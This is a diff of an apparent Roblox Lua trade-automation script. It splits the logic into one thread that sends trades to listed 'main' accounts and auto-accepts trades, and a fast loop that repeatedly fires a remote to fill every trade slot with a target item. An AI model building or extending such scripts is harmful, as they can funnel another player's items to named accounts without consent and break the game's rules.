@@ -70,10 +70,9 @@ local function getMultipleUniqueIdsByName(itemName, limit)
 	return uniqueIds
 end
 
--- Main automation loop combining sending, accepting, and 18-slot item adding
+-- Thread 1: Handles sending and accepting trades
 task.spawn(function()
 	while true do
-		-- Send trades to listed accounts
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
 				if Players:FindFirstChild(playerName) then
@@ -82,19 +81,25 @@ task.spawn(function()
 			end
 		end
 
-		-- Accept trades if enabled
 		if ForceReceiver then
 			acceptTradeForAll()
 		end
 
-		-- Add items up to the 18 trade slot limit
+		task.wait(2)
+	end
+end)
+
+-- Thread 2: Dedicated fast loop to continuously add items up to the 18 slot limit
+task.spawn(function()
+	while true do
 		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, MAX_ITEMS_TO_ADD)
 		for _, uniqueId in ipairs(uniqueIds) do
 			pcall(function()
 				addItemRemote:FireServer(uniqueId)
 			end)
 		end
-
-		task.wait(1)
+		
+		-- Fast interval to keep trying to fill the slots immediately when a trade opens
+		task.wait(0.2)
 	end
 end)
